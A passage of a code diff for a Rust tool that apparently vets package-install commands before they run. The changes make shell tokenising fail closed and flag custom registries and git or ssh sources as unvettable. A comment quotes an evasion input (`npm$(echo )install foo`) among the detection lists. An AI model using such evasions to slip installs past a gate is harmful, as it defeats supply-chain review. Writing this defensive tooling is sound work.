@@ -318,10 +318,12 @@ impl Ecosystem {
 // literal `&` / `|` / `;` inside a quoted flag value does not truncate
 // the package scan.
 lazy_static! {
-    // Backslash + line-ending + any whitespace = shell line-continuation.
+    // Backslash + line-ending + indentation = shell line-continuation.
     // Collapsed to a single space before install detection. Covers POSIX
-    // (`\n`), Windows (`\r\n`), AND legacy Mac (`\r` alone).
-    static ref LINE_CONT_RE: Regex = Regex::new(r"\\(?:\r\n|\n|\r)\s*").unwrap();
+    // (`\n`), Windows (`\r\n`), AND legacy Mac (`\r` alone). Restrict the
+    // suffix to horizontal whitespace: `\s*` also swallowed a later,
+    // unescaped newline and merged distinct shell commands (#227 round 2).
+    static ref LINE_CONT_RE: Regex = Regex::new(r"\\(?:\r\n|\n|\r)[ \t]*").unwrap();
     // Verb subcommand wrapped in `['"]?…['"]?` — closes the BLOCKER both
     // reviewers flagged on #146: `npm 'install' lodash` / `pip "install" x`
     // would otherwise bypass (regex doesn't match the quoted subcommand,
@@ -416,14 +418,14 @@ lazy_static! {
 /// them. The substitution body still consumes its source span so subsequent
 /// tokens align on byte offsets in the *original* command.
 ///
-/// Unmatched quotes are tolerated: the unclosed run is consumed to end-of-input
-/// as a single token. The gate's fallback contract is no-panic; an unmatched
-/// quote at worst yields a noisy token that the regex pass ignores.
+/// Unmatched quotes, substitutions, and trailing escapes are errors. The
+/// caller turns an install-shaped tokenisation failure into an unvettable
+/// finding; silently returning a best-effort token stream would fail open.
 ///
 /// ANSI-C `$'…'` quotes are treated as single quotes for tokenising — we
 /// do not interpret `\n`/`\t` escapes because the gate only needs the verb
 /// surface, not the byte-perfect payload.
-fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
+fn shell_tokens(cmd: &str) -> std::result::Result<Vec<(usize, String)>, &'static str> {
     let mut out = Vec::new();
     let bytes = cmd.as_bytes();
     let mut i = 0;
@@ -478,10 +480,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                 while k < bytes.len() && (bytes[k] as char) != '\'' {
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                // Step past the closing quote if present; otherwise consume
-                // to end-of-input (unmatched quote — best effort, no panic).
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated single quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // ANSI-C $'…' quote: same shape as single quote for our purposes.
@@ -496,8 +499,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated ANSI-C quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // Double quote: no operator splitting, no expansion. `\"` is the
@@ -520,8 +526,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[q_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated double quote");
+                }
+                payload.push_str(&cmd[q_start..k]);
+                j = k + 1;
                 continue;
             }
             // Command substitution `$(…)`: consume balanced. The body is
@@ -531,12 +540,15 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
             if cj == '$' && j + 1 < bytes.len() && (bytes[j + 1] as char) == '(' {
                 let body_start = j + 2;
                 let k = scan_balanced_paren(cmd, body_start);
+                if k == bytes.len() {
+                    return Err("unterminated command substitution");
+                }
                 // Copy body verbatim into the payload so any package-name
                 // text that lives at the same shell-word level (e.g. an
                 // adversary writing `npm$(echo )install foo`) does not
                 // disappear from the regex pass.
-                payload.push_str(&cmd[body_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                payload.push_str(&cmd[body_start..k]);
+                j = k + 1;
                 continue;
             }
             // Backtick substitution: same role as `$(…)`, single-level only.
@@ -550,8 +562,11 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                     }
                     k += 1;
                 }
-                payload.push_str(&cmd[body_start..k.min(bytes.len())]);
-                j = if k < bytes.len() { k + 1 } else { k };
+                if k == bytes.len() {
+                    return Err("unterminated backtick substitution");
+                }
+                payload.push_str(&cmd[body_start..k]);
+                j = k + 1;
                 continue;
             }
             // Backslash escape outside quotes: skip one char.
@@ -560,13 +575,16 @@ fn shell_tokens(cmd: &str) -> Vec<(usize, String)> {
                 j += 2;
                 continue;
             }
+            if cj == '\\' {
+                return Err("trailing backslash escape");
+            }
             payload.push(cj);
             j += 1;
         }
         out.push((start, payload));
         i = j;
     }
-    out
+    Ok(out)
 }
 
 /// Scan forward from `start` (which should point just past the opening `(`)
@@ -730,7 +748,9 @@ fn extract_recursion_segments(cmd: &str) -> Vec<String> {
     // character is `c`. The next token after the matching cluster is the
     // command body. A long option (`--`) or non-option token before `-c`
     // ends the scan without recursion.
-    let toks = shell_tokens(cmd);
+    let Ok(toks) = shell_tokens(cmd) else {
+        return out;
+    };
     let mut idx = 0;
     while idx < toks.len() {
         let head = installer_basename(toks[idx].1.as_str()).to_ascii_lowercase();
@@ -929,7 +949,9 @@ const DATA_CONSUMING_UTILITIES: &[&str] = &[
 /// begin with a shell operator, and on any unknown head.
 #[allow(dead_code)] // exercised by tests + reserved for principled-path follow-up
 fn command_head_is_data_utility(segment: &str) -> bool {
-    let tokens = shell_tokens(segment);
+    let Ok(tokens) = shell_tokens(segment) else {
+        return false;
+    };
     let head = match tokens.first() {
         Some((_, t)) => t.as_str(),
         None => return false,
@@ -962,7 +984,11 @@ fn command_head_is_data_utility(segment: &str) -> bool {
 /// token payloads (so `tok.len()` no longer equals the source-span length
 /// for a quoted token).
 fn mask_data_utility_segments(cmd: &str) -> String {
-    let tokens = shell_tokens(cmd);
+    let Ok(tokens) = shell_tokens(cmd) else {
+        // Do not suppress any surface when shell structure is ambiguous.
+        // The token-first detector will emit the fail-closed finding.
+        return cmd.to_string();
+    };
     let bytes = cmd.as_bytes();
     let mut out: Vec<u8> = bytes.to_vec();
 
@@ -1146,43 +1172,47 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // linear scan (`claimed.iter().any(...)`) before #149.
     let mut claimed: std::collections::BTreeMap<usize, usize> = std::collections::BTreeMap::new();
 
-    // Each entry: (regex, ecosystem, local_only_caveat). `Some(msg)` means
+    // Each entry: (regex, manager, ecosystem, local_only_caveat). `Some(msg)` means
     // detection is local-only and must fail closed to Ask without registry/OSV
     // calls. This preserves lab #144's expanded install detection while
     // honouring the updated direction not to add cloud API dependencies where
     // local Mongo/package intelligence would be needed. `None` keeps the
     // existing first-class npm/PyPI behaviour.
-    let ordered: [(&Regex, Ecosystem, Option<&'static str>); 15] = [
-        (&*UV_RE, Ecosystem::Pypi, None),
-        (&*NPM_RE, Ecosystem::Npm, None),
-        (&*PNPM_RE, Ecosystem::Npm, None),
+    let ordered: [(&Regex, &str, Ecosystem, Option<&'static str>); 15] = [
+        (&*UV_RE, "uv", Ecosystem::Pypi, None),
+        (&*NPM_RE, "npm", Ecosystem::Npm, None),
+        (&*PNPM_RE, "pnpm", Ecosystem::Npm, None),
         (
             &*PNPM_UPDATE_RE,
+            "pnpm",
             Ecosystem::Npm,
             Some(
                 "pnpm update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*YARN_RE, Ecosystem::Npm, None),
+        (&*YARN_RE, "yarn", Ecosystem::Npm, None),
         (
             &*BUN_RE,
+            "bun",
             Ecosystem::Npm,
             Some(
                 "bun install package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*PIP_RE, Ecosystem::Pypi, None),
-        (&*POETRY_RE, Ecosystem::Pypi, None),
+        (&*PIP_RE, "pip", Ecosystem::Pypi, None),
+        (&*POETRY_RE, "poetry", Ecosystem::Pypi, None),
         (
             &*POETRY_UPDATE_RE,
+            "poetry",
             Ecosystem::Pypi,
             Some(
                 "poetry update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
             ),
         ),
-        (&*PIPX_RE, Ecosystem::Pypi, None),
+        (&*PIPX_RE, "pipx", Ecosystem::Pypi, None),
         (
             &*PDM_RE,
+            "pdm",
             Ecosystem::Pypi,
             Some(
                 "pdm package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
@@ -1190,6 +1220,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*PIPENV_RE,
+            "pipenv",
             Ecosystem::Pypi,
             Some(
                 "pipenv package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
@@ -1197,6 +1228,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*CONDA_RE,
+            "conda",
             Ecosystem::Pypi,
             Some(
                 "conda resolves from conda channels; not vettable against PyPI — review manually",
@@ -1204,6 +1236,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*MAMBA_RE,
+            "mamba",
             Ecosystem::Pypi,
             Some(
                 "mamba resolves from conda channels; not vettable against PyPI — review manually",
@@ -1211,6 +1244,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
         ),
         (
             &*BREW_RE,
+            "brew",
             Ecosystem::Unknown,
             Some(
                 "brew packages require Homebrew/local package intelligence; not vettable by this gate yet",
@@ -1226,7 +1260,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
     // arg-text from `cmd` itself (preserving the original characters).
     let masked = mask_quoted_operators(cmd);
 
-    for (re, eco, local_only_caveat) in ordered {
+    for (re, manager, eco, local_only_caveat) in ordered {
         for m in re.find_iter(&masked) {
             let (start, end) = (m.start(), m.end());
             // Skip if any earlier (higher-priority) pattern already claimed this span.
@@ -1243,7 +1277,7 @@ fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
             // masking only ever rewrites bytes inside quoted regions to
             // spaces, so the offsets are identical in both strings.
             let arg_string = cap.get(1).map(|m| &cmd[m.start()..m.end()]).unwrap_or("");
-            let (pkgs, has_editable, lockfile_source) = parse_package_args(arg_string);
+            let (pkgs, has_editable, lockfile_source) = parse_package_args(arg_string, manager);
             // Local-only added surfaces: package names may parse, but without
             // the repo's requested Mongo/local-model package-intelligence path
             // we must not query remote registries/OSV. Drop parsed packages so
@@ -1443,6 +1477,7 @@ fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
             flag,
             "--dir"
                 | "-C"
+                | "--registry"
                 | "--global-dir"
                 | "--store-dir"
                 | "--config-dir"
@@ -1454,6 +1489,7 @@ fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
         "yarn" => matches!(
             flag,
             "--cwd"
+                | "--registry"
                 | "--use-yarnrc"
                 | "--mutex"
                 | "--cache-folder"
@@ -1462,7 +1498,7 @@ fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
                 | "--link-folder"
                 | "--global-folder"
         ),
-        "bun" => matches!(flag, "--cwd" | "--config" | "--backend"),
+        "bun" => matches!(flag, "--cwd" | "--config" | "--backend" | "--registry"),
         "pip" => matches!(
             flag,
             "--python"
@@ -1478,10 +1514,26 @@ fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
                 | "--cache-dir"
                 | "--use-feature"
                 | "--use-deprecated"
+                | "--index-url"
+                | "-i"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
         ),
         "uv" => matches!(
             flag,
-            "--directory" | "--project" | "--config-file" | "--cache-dir" | "--python" | "--color"
+            "--directory"
+                | "--project"
+                | "--config-file"
+                | "--cache-dir"
+                | "--python"
+                | "--color"
+                | "--index"
+                | "--default-index"
+                | "--index-url"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
         ),
         "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
         "pipx" => matches!(flag, "--global" | "--pip-args" | "--python"),
@@ -1503,14 +1555,60 @@ fn manager_option_is_boolean(manager: &str, flag: &str) -> bool {
     match manager {
         "npm" => matches!(
             flag,
-            "--global" | "-g" | "--force" | "--silent" | "--json" | "--yes" | "-y"
+            "--global"
+                | "-g"
+                | "--force"
+                | "--silent"
+                | "--json"
+                | "--yes"
+                | "-y"
+                | "--save"
+                | "--save-dev"
+                | "-D"
+                | "--save-prod"
+                | "-P"
+                | "--save-optional"
+                | "-O"
+                | "--save-peer"
+                | "--no-save"
+                | "--production"
+                | "--ignore-scripts"
+                | "--no-audit"
+                | "--no-fund"
         ),
         "pnpm" => matches!(
             flag,
-            "--global" | "-g" | "--workspace-root" | "-w" | "--silent"
+            "--global"
+                | "-g"
+                | "--workspace-root"
+                | "-w"
+                | "--silent"
+                | "--frozen-lockfile"
+                | "--lockfile-only"
+                | "--ignore-scripts"
+                | "--offline"
+                | "--prefer-offline"
         ),
-        "yarn" => matches!(flag, "--silent" | "--verbose" | "--json" | "--offline"),
-        "bun" => matches!(flag, "--silent" | "--verbose" | "--no-save"),
+        "yarn" => matches!(
+            flag,
+            "--silent"
+                | "--verbose"
+                | "--json"
+                | "--offline"
+                | "--frozen-lockfile"
+                | "--production"
+                | "--ignore-scripts"
+                | "--non-interactive"
+        ),
+        "bun" => matches!(
+            flag,
+            "--silent"
+                | "--verbose"
+                | "--no-save"
+                | "--frozen-lockfile"
+                | "--production"
+                | "--dry-run"
+        ),
         "pip" => {
             matches!(
                 flag,
@@ -1521,13 +1619,34 @@ fn manager_option_is_boolean(manager: &str, flag: &str) -> bool {
                     | "--disable-pip-version-check"
                     | "--no-color"
                     | "--no-python-version-warning"
-            ) || flag.starts_with("-v")
-                || flag.starts_with("-q")
+                    | "--user"
+                    | "-U"
+                    | "--upgrade"
+                    | "--pre"
+                    | "--no-deps"
+                    | "--no-index"
+                    | "--verbose"
+                    | "--quiet"
+            ) || is_repeated_short_flag(flag, 'v')
+                || is_repeated_short_flag(flag, 'q')
         }
-        "uv" => matches!(
-            flag,
-            "--offline" | "--no-cache" | "--native-tls" | "--managed-python"
-        ),
+        "uv" => {
+            matches!(
+                flag,
+                "--offline"
+                    | "--no-cache"
+                    | "--native-tls"
+                    | "--managed-python"
+                    | "--verbose"
+                    | "--quiet"
+                    | "-U"
+                    | "--upgrade"
+                    | "--pre"
+                    | "--no-deps"
+                    | "--no-index"
+            ) || is_repeated_short_flag(flag, 'v')
+                || is_repeated_short_flag(flag, 'q')
+        }
         "poetry" => matches!(
             flag,
             "--no-cache" | "--no-plugins" | "--no-interaction" | "-n"
@@ -1539,6 +1658,79 @@ fn manager_option_is_boolean(manager: &str, flag: &str) -> bool {
         "brew" => matches!(flag, "--debug" | "--quiet" | "--verbose"),
         _ => false,
     }
+}
+
+fn is_repeated_short_flag(flag: &str, expected: char) -> bool {
+    flag.strip_prefix('-').is_some_and(|suffix| {
+        !suffix.is_empty() && suffix.chars().all(|character| character == expected)
+    })
+}
+
+fn trim_shell_token(token: &str) -> &str {
+    token.trim().trim_matches(['\'', '"'])
+}
+
+fn is_default_registry(manager: &str, value: Option<&str>) -> bool {
+    let Some(value) = value.map(trim_shell_token) else {
+        return false;
+    };
+    let value = value.trim_end_matches('/');
+    match manager {
+        "npm" | "pnpm" | "yarn" | "bun" => value.eq_ignore_ascii_case("https://registry.npmjs.org"),
+        "pip" | "uv" => value.eq_ignore_ascii_case("https://pypi.org/simple"),
+        _ => false,
+    }
+}
+
+/// Return a credential-free explanation when a CLI option can change the
+/// source whose package is actually installed. Explicitly selecting the same
+/// public registry queried by this gate is safe; config/directory switches and
+/// alternate or additional sources are unvettable without evaluating external
+/// configuration.
+fn source_option_unvettable_detail(
+    manager: &str,
+    flag: &str,
+    value: Option<&str>,
+) -> Option<String> {
+    let registry_flag = matches!(manager, "npm" | "pnpm" | "yarn" | "bun") && flag == "--registry";
+    let primary_index_flag =
+        matches!(manager, "pip" | "uv") && matches!(flag, "--index-url" | "-i" | "--default-index");
+    if registry_flag || primary_index_flag {
+        return (!is_default_registry(manager, value)).then(|| {
+            format!(
+                "{manager} {flag} selects a registry the gate does not query; refusing to vet against unrelated metadata"
+            )
+        });
+    }
+
+    let changes_source_or_config = match manager {
+        "npm" => matches!(flag, "--userconfig" | "--globalconfig" | "--prefix" | "-C"),
+        "pnpm" => matches!(flag, "--dir" | "-C" | "--config-dir" | "--workspace-dir"),
+        "yarn" => matches!(flag, "--cwd" | "--use-yarnrc"),
+        "bun" => matches!(flag, "--cwd" | "--config"),
+        "pip" => matches!(
+            flag,
+            "--extra-index-url" | "--find-links" | "-f" | "--no-index"
+        ),
+        "uv" => matches!(
+            flag,
+            "--index"
+                | "--extra-index-url"
+                | "--find-links"
+                | "-f"
+                | "--no-index"
+                | "--config-file"
+                | "--directory"
+                | "--project"
+        ),
+        "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
+        _ => false,
+    };
+    changes_source_or_config.then(|| {
+        format!(
+            "{manager} {flag} can change registry/config resolution; the selected metadata source cannot be verified"
+        )
+    })
 }
 
 fn token_install_spec(
@@ -1652,12 +1844,13 @@ fn locate_token_install(
     tokens: &[(usize, String)],
     head_idx: usize,
     segment_end: usize,
-) -> Option<(TokenInstallSpec, bool)> {
+) -> Option<(TokenInstallSpec, bool, Option<String>)> {
     let mut idx = head_idx + 1;
     let mut ambiguous_option = false;
+    let mut source_option_detail = None;
     while idx < segment_end {
         if let Some(spec) = token_install_spec(manager, tokens, idx, segment_end) {
-            return Some((spec, ambiguous_option));
+            return Some((spec, ambiguous_option, source_option_detail));
         }
 
         let token = tokens[idx].1.as_str();
@@ -1665,16 +1858,26 @@ fn locate_token_install(
             if ambiguous_option {
                 for probe in idx + 1..segment_end {
                     if let Some(spec) = token_install_spec(manager, tokens, probe, segment_end) {
-                        return Some((spec, true));
+                        return Some((spec, true, source_option_detail));
                     }
                 }
             }
             return None;
         }
 
-        let (flag, attached) = token
+        let (flag, attached_value) = token
             .split_once('=')
-            .map_or((token, false), |(flag, _)| (flag, true));
+            .map_or((token, None), |(flag, value)| (flag, Some(value)));
+        let option_value = attached_value.or_else(|| {
+            tokens
+                .get(idx + 1)
+                .filter(|(_, value)| !value.starts_with('-'))
+                .map(|(_, value)| value.as_str())
+        });
+        if let Some(detail) = source_option_unvettable_detail(manager, flag, option_value) {
+            source_option_detail.get_or_insert(detail);
+        }
+        let attached = attached_value.is_some();
         if attached || manager_option_is_boolean(manager, flag) {
             idx += 1;
         } else if manager_option_takes_value(manager, flag) {
@@ -1697,7 +1900,20 @@ fn detect_tokenised_installs(
     claimed: &mut std::collections::BTreeMap<usize, usize>,
     out: &mut Vec<ParsedInstall>,
 ) {
-    let tokens = shell_tokens(cmd);
+    let tokens = match shell_tokens(cmd) {
+        Ok(tokens) => tokens,
+        Err(error) => {
+            out.push(ParsedInstall {
+                ecosystem: Ecosystem::Unknown,
+                packages: Vec::new(),
+                has_editable: false,
+                unvettable: Some(format!(
+                    "shell tokenisation failed ({error}); refusing to treat an ambiguous command as safe"
+                )),
+            });
+            return;
+        }
+    };
     let mut segment_start = 0;
     while segment_start < tokens.len() {
         while segment_start < tokens.len() && is_shell_operator(&tokens[segment_start].1) {
@@ -1722,7 +1938,7 @@ fn detect_tokenised_installs(
             let Some(manager) = normalised_manager(&tokens[head_idx].1) else {
                 continue;
             };
-            let Some((spec, ambiguous_option)) =
+            let Some((spec, ambiguous_option, source_option_detail)) =
                 locate_token_install(&manager, &tokens, head_idx, segment_end)
             else {
                 continue;
@@ -1773,8 +1989,8 @@ fn detect_tokenised_installs(
                 .map(|(_, token)| token.as_str())
                 .collect::<Vec<_>>()
                 .join(" ");
-            let (packages, has_editable, source_detail) = parse_package_args(&arg_string);
-            let unvettable = if packages.is_empty() && !has_editable {
+            let (packages, has_editable, source_detail) = parse_package_args(&arg_string, &manager);
+            let parsed_detail = if packages.is_empty() && !has_editable {
                 Some(source_detail.unwrap_or_else(|| {
                     "install resolves packages from a lockfile/requirements file the gate cannot vet"
                         .to_string()
@@ -1786,7 +2002,7 @@ fn detect_tokenised_installs(
                 ecosystem: spec.ecosystem,
                 packages,
                 has_editable,
-                unvettable,
+                unvettable: source_option_detail.or(parsed_detail),
             });
         }
 
@@ -1809,7 +2025,11 @@ fn detect_bare_lockfile_installs(
     claimed: &mut std::collections::BTreeMap<usize, usize>,
     out: &mut Vec<ParsedInstall>,
 ) {
-    let tokens = shell_tokens(cmd);
+    let Ok(tokens) = shell_tokens(cmd) else {
+        // `detect_tokenised_installs` runs immediately before this pass and
+        // owns the single fail-closed finding for the same error.
+        return;
+    };
     // Look-ahead helper that lowercases the Nth token relative to `idx` so
     // verb sub-commands like `INSTALL`, `Ci`, `Sync` classify the same as
     // their canonical lowercase form (Windows file-systems and shells are
@@ -2080,7 +2300,7 @@ const PIP_VALUE_CONSUMING_FLAGS: &[&str] = &[
 /// saw_editable_arg, lockfile_source). `lockfile_source` is `Some(detail)`
 /// when a `-r`/`--requirement`/`-c`/`--constraint` indirection flag was seen
 /// (in either the separate or attached `=` form).
-fn parse_package_args(s: &str) -> ParsedPackageArgs {
+fn parse_package_args(s: &str, manager: &str) -> ParsedPackageArgs {
     let mut pkgs = Vec::new();
     let mut editable = false;
     let mut lockfile_source: Option<String> = None;
@@ -2094,21 +2314,6 @@ fn parse_package_args(s: &str) -> ParsedPackageArgs {
         if tok.starts_with('#') {
             break;
         }
-        if tok == "-e" || tok == "--editable" {
-            let target = tokens.next().unwrap_or("(unspecified)");
-            if is_remote_package_source(target) {
-                lockfile_source.get_or_insert_with(|| {
-                    format!(
-                        "install uses remote source '{}' ({}) — the gate cannot verify its registry identity",
-                        sanitise_source_target(target),
-                        tok
-                    )
-                });
-            } else {
-                editable = true;
-            }
-            continue;
-        }
         // Requirements / constraints indirection. Accept BOTH the separate
         // form (`-r req.txt`, `--requirement req.txt`) and the attached `=`
         // form (`--requirement=req.txt`, `-r=req.txt`). When the file is
@@ -2116,7 +2321,40 @@ fn parse_package_args(s: &str) -> ParsedPackageArgs {
         // recovers it. Either way, set `lockfile_source` so the install is
         // flagged unvettable (#111 G1 follow-up).
         if let Some((flag, attached)) = split_attached_flag(tok) {
-            if matches!(flag, "-r" | "--requirement" | "-c" | "--constraint") {
+            if matches!(flag, "-e" | "--editable") {
+                let target = match attached {
+                    Some(value) if !value.is_empty() => Some(value),
+                    Some(_) => None,
+                    None => tokens
+                        .peek()
+                        .copied()
+                        .filter(|value| !value.starts_with('-'))
+                        .and_then(|_| tokens.next()),
+                };
+                let Some(target) = target else {
+                    lockfile_source.get_or_insert_with(|| {
+                        format!(
+                            "{flag} is missing its editable target; the install command cannot be vetted"
+                        )
+                    });
+                    continue;
+                };
+                if is_remote_package_source(target) {
+                    lockfile_source.get_or_insert_with(|| {
+                        format!(
+                            "install uses remote source '{}' ({}) — the gate cannot verify its registry identity",
+                            sanitise_source_target(target),
+                            flag
+                        )
+                    });
+                } else {
+                    editable = true;
+                }
+                continue;
+            }
+            if matches!(manager, "pip" | "uv" | "pipx")
+                && matches!(flag, "-r" | "--requirement" | "-c" | "--constraint")
+            {
                 let target: String = match attached {
                     Some(v) => v.to_string(),
                     None => tokens.next().unwrap_or("(unspecified)").to_string(),
@@ -2131,7 +2369,13 @@ fn parse_package_args(s: &str) -> ParsedPackageArgs {
                 });
                 continue;
             }
-            if PIP_VALUE_CONSUMING_FLAGS.contains(&flag) {
+            let value = attached.or_else(|| tokens.peek().copied());
+            if let Some(detail) = source_option_unvettable_detail(manager, flag, value) {
+                lockfile_source.get_or_insert(detail);
+            }
+            if PIP_VALUE_CONSUMING_FLAGS.contains(&flag)
+                || manager_option_takes_value(manager, flag)
+            {
                 // Value-bearing flag: consume the value token only when it
                 // was NOT attached with `=`. #145 case 3.
                 if attached.is_none() {
@@ -2143,27 +2387,28 @@ fn parse_package_args(s: &str) -> ParsedPackageArgs {
         if tok.starts_with('-') {
             continue;
         }
-        if is_remote_package_source(tok) {
+        let token = trim_shell_token(tok);
+        if is_remote_package_source(token) {
             lockfile_source.get_or_insert_with(|| {
                 format!(
                     "install uses remote source '{}' — the gate cannot verify its registry identity",
-                    sanitise_source_target(tok)
+                    sanitise_source_target(token)
                 )
             });
             continue;
         }
-        if tok == "."
-            || tok.starts_with(".[")
-            || tok.starts_with("./")
-            || tok.starts_with("../")
-            || tok.starts_with("/")
-            || tok.starts_with("file:")
+        if token == "."
+            || token.starts_with(".[")
+            || token.starts_with("./")
+            || token.starts_with("../")
+            || token.starts_with('/')
+            || token.starts_with("file:")
         {
             editable = true;
             continue;
         }
 
-        let (name, version) = split_name_version(tok);
+        let (name, version) = split_name_version(token);
         if !name.is_empty() {
             pkgs.push((name, version));
         }
@@ -2173,18 +2418,51 @@ fn parse_package_args(s: &str) -> ParsedPackageArgs {
 }
 
 fn is_remote_package_source(token: &str) -> bool {
-    let lower = token.to_ascii_lowercase();
+    let lower = trim_shell_token(token).to_ascii_lowercase();
     [
-        "http://", "https://", "git://", "git+", "ssh://", "ftp://", "hg+", "svn+", "bzr+",
+        "http://",
+        "https://",
+        "git://",
+        "git+http://",
+        "git+https://",
+        "git+ssh://",
+        "git+",
+        "git@",
+        "ssh://",
+        "ftp://",
+        "hg+",
+        "svn+",
+        "bzr+",
     ]
     .iter()
     .any(|prefix| lower.starts_with(prefix))
 }
 
+fn sanitise_scp_source(target: &str) -> Option<String> {
+    let (user, location) = target.split_once('@')?;
+    if !user.eq_ignore_ascii_case("git") {
+        return None;
+    }
+    let (host, path) = location.split_once(':')?;
+    if host.is_empty()
+        || host
+            .chars()
+            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\'))
+    {
+        return None;
+    }
+    let path = path
+        .split(['?', '#'])
+        .next()
+        .filter(|path| !path.is_empty())?;
+    let basename = path.rsplit('/').find(|component| !component.is_empty())?;
+    Some(format!("{host}/{basename}"))
+}
+
 /// Reduce an untrusted source target to a credential-free host/basename (for
 /// remote URLs) or basename (for local files) before it enters a finding.
 fn sanitise_source_target(target: &str) -> String {
-    let trimmed = target.trim_matches(['\'', '"']);
+    let trimmed = trim_shell_token(target);
     let parse_target = trimmed
         .strip_prefix("git+")
         .or_else(|| trimmed.strip_prefix("hg+"))
@@ -2192,28 +2470,31 @@ fn sanitise_source_target(target: &str) -> String {
         .or_else(|| trimmed.strip_prefix("bzr+"))
         .unwrap_or(trimmed);
 
-    let label = url::Url::parse(parse_target)
-        .ok()
-        .and_then(|url| {
-            let host = url.host_str()?;
-            let basename = url
-                .path_segments()
-                .and_then(|mut segments| segments.rfind(|part| !part.is_empty()))
-                .unwrap_or("<remote>");
-            Some(format!("{}/{}", host, basename))
-        })
+    let label = sanitise_scp_source(trimmed)
         .or_else(|| {
-            if is_remote_package_source(trimmed) {
-                // Never fall back to echoing a malformed remote target: URL
-                // parsing may have failed precisely around user-info, and a
-                // best-effort secret regex is not an authorization boundary.
-                Some("<remote>".to_string())
-            } else {
-                std::path::Path::new(trimmed)
-                    .file_name()
-                    .and_then(|name| name.to_str())
-                    .map(str::to_string)
-            }
+            url::Url::parse(parse_target)
+                .ok()
+                .and_then(|url| {
+                    let host = url.host_str()?;
+                    let basename = url
+                        .path_segments()
+                        .and_then(|mut segments| segments.rfind(|part| !part.is_empty()))
+                        .unwrap_or("<remote>");
+                    Some(format!("{}/{}", host, basename))
+                })
+                .or_else(|| {
+                    if is_remote_package_source(trimmed) {
+                        // Never fall back to echoing a malformed remote target: URL
+                        // parsing may have failed precisely around user-info, and a
+                        // best-effort secret regex is not an authorization boundary.
+                        Some("<remote>".to_string())
+                    } else {
+                        std::path::Path::new(trimmed)
+                            .file_name()
+                            .and_then(|name| name.to_str())
+                            .map(str::to_string)
+                    }
+                })
         })
         .unwrap_or_else(|| "<unspecified>".to_string());
 
@@ -2408,15 +2689,26 @@ fn http_post_json(url: &str, body: &Value) -> Result<Value, String> {
 
 type PackageMetadata = (String, DateTime<Utc>);
 
-/// A mutable cache entry is only a write-suppression hint. The authoritative
-/// fetch always runs before metadata can participate in an Allow decision.
+/// A fresh mutable cache entry may short-circuit the network only when its
+/// publish time necessarily triggers the configured cooldown. In that case it
+/// can only make the decision stricter (Block); metadata old enough to permit
+/// Allow is always revalidated against the authoritative registry. `cache_get`
+/// already discards entries outside the on-disk TTL, so `None` also covers a
+/// stale hint.
 fn revalidate_cached_metadata<F>(
     cached_hint: Option<PackageMetadata>,
+    cooldown_days: u32,
     fetch_authoritative: F,
 ) -> Result<(PackageMetadata, bool), String>
 where
     F: FnOnce() -> Result<PackageMetadata, String>,
 {
+    if let Some(cached) = cached_hint.as_ref() {
+        let age = (Utc::now() - cached.1).max(ChronoDuration::zero());
+        if age < ChronoDuration::days(i64::from(cooldown_days)) {
+            return Ok((cached.clone(), false));
+        }
+    }
     let authoritative = fetch_authoritative()?;
     let cache_needs_refresh = cached_hint.as_ref() != Some(&authoritative);
     Ok((authoritative, cache_needs_refresh))
@@ -2425,80 +2717,90 @@ where
 /// Resolve (version, publish_time) for the package. If `pinned` is Some, use
 /// that version; otherwise resolve and use the registry's `latest`.
 /// Cache keys include the version so pinned-and-unpinned don't collide.
-fn npm_metadata(pkg: &str, pinned: Option<&str>) -> Result<PackageMetadata, String> {
+fn npm_metadata(
+    pkg: &str,
+    pinned: Option<&str>,
+    cooldown_days: u32,
+) -> Result<PackageMetadata, String> {
     let cache_key = format!("{}@{}", pkg, pinned.unwrap_or("__latest__"));
     let cached_hint = cache_get(Ecosystem::Npm, &cache_key);
-    let ((resolved, publish), refresh_cache) = revalidate_cached_metadata(cached_hint, || {
